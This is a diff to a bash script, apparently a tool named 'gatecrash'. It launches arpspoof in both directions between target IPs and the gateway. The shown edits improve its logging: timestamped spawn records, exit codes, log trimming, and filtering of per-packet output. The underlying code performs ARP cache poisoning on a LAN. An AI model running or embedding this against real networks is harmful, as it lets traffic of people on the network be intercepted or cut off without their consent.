@@ -126,8 +126,9 @@ ARPSPOOF_LOG_DIR="/var/log"
 
 start_arpspoof() {
     # $1 = target IP, $2 = direction ("fwd" tells the target we're the gateway,
-    # "rev" tells the gateway we're the target). Truncates the log file each
-    # spawn so the watchdog always sees the most recent error.
+    # "rev" tells the gateway we're the target). Wraps arpspoof in a subshell
+    # so we can append its exit code to the log (revealing whether it died
+    # from a signal — exit 143 = SIGTERM — or a real error).
     local ip="$1" dir="$2" target host logf
     if [[ "$dir" == "fwd" ]]; then
         target="$ip"; host="$GATEWAY_IP"
@@ -135,18 +136,27 @@ start_arpspoof() {
         target="$GATEWAY_IP"; host="$ip"
     fi
     logf="$ARPSPOOF_LOG_DIR/gatecrash-arpspoof-${ip}-${dir}.log"
-    : > "$logf" 2>/dev/null || true
-    arpspoof -i "$LAN_IF" -t "$target" "$host" >/dev/null 2>"$logf" &
+    # Trim if growing — arpspoof writes one stderr line per packet sent.
+    if [[ -f "$logf" ]] && [[ $(wc -c < "$logf" 2>/dev/null || echo 0) -gt 100000 ]]; then
+        tail -c 20000 "$logf" > "$logf.tmp" 2>/dev/null && mv "$logf.tmp" "$logf"
+    fi
+    {
+        printf -- '--- spawn at %s (target=%s host=%s) ---\n' "$(date '+%Y-%m-%d %H:%M:%S')" "$target" "$host"
+        arpspoof -i "$LAN_IF" -t "$target" "$host" 2>&1
+        printf -- '[exit %d at %s]\n' "$?" "$(date '+%Y-%m-%d %H:%M:%S')"
+    } >>"$logf" &
 }
 
 log_arpspoof_death() {
-    # $1 = target IP, $2 = direction. Pulls the last non-empty stderr line
-    # from arpspoof's log and appends it to the audit log so users can see
-    # WHY it died (typically: "couldn't arp for host <ip>").
-    local ip="$1" dir="$2" logf last
+    # $1 = target IP, $2 = direction. Reports the cause to the audit log,
+    # filtering out arpspoof's normal "arp reply ..." per-packet output so we
+    # surface the actual error (or exit code).
+    local ip="$1" dir="$2" logf detail
     logf="$ARPSPOOF_LOG_DIR/gatecrash-arpspoof-${ip}-${dir}.log"
-    last=$(grep -v '^$' "$logf" 2>/dev/null | tail -1)
-    log WARN "ARPSPOOF $ip ($dir) exited — ${last:-no stderr captured}"
+    detail=$(grep -v '^$' "$logf" 2>/dev/null \
+             | grep -vE 'arp reply [0-9]+\.[0-9]+\.[0-9]+\.[0-9]+ is-at' \
+             | tail -2 | tr '\n' '|')
+    log WARN "ARPSPOOF $ip ($dir) exited — ${detail:-no detail captured}"
 }
 
 for ip in $TARGET_IPS; do
